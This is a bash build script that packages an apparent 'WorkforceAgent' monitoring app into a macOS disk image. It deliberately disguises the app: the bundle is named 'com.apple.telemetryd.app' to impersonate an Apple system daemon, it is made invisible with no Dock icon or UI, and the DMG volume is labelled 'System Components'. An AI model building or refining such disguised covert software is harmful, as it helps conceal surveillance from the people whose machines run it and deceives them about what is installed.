#!/usr/bin/env bash
# Build the stealth macOS .app and package it into a distributable .dmg.
# The app bundle is named 'com.apple.telemetryd.app' and is completely
# invisible: no Dock icon, no app switcher, no tray, no UI.
#
# Must run on macOS (uses sips/iconutil/hdiutil). Run from anywhere:
#   bash agent/packaging/macos/build_dmg_stealth.sh
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PKG_DIR="$(dirname "$HERE")"
cd "$PKG_DIR"

# 1. Build the .icns from the master PNG
ICONSET="icons/icon.iconset"
rm -rf "$ICONSET"
mkdir -p "$ICONSET"
for size in 16 32 64 128 256 512; do
  sips -z "$size" "$size" icons/icon.png --out "$ICONSET/icon_${size}x${size}.png" >/dev/null
  d=$((size * 2))
  sips -z "$d" "$d" icons/icon.png --out "$ICONSET/icon_${size}x${size}@2x.png" >/dev/null
done
iconutil -c icns "$ICONSET" -o icons/icon.icns

# 2. Build the stealth .app bundle with PyInstaller (no UI).
pyinstaller --noconfirm WorkforceAgent-Stealth.spec

APP="dist/com.apple.telemetryd.app"
DMG="dist/WorkforceAgent-Stealth-macos.dmg"
STAGE="dist/dmg-stealth-stage"

# 3. Package into DMG
rm -f "$DMG"
rm -rf "$STAGE"
mkdir -p "$STAGE"
cp -R "$APP" "$STAGE/"
ln -s /Applications "$STAGE/Applications"

hdiutil create \
  -volname "System Components" \
  -srcfolder "$STAGE" \
  -ov -format UDZO \
  "$DMG"

echo "Built $DMG"
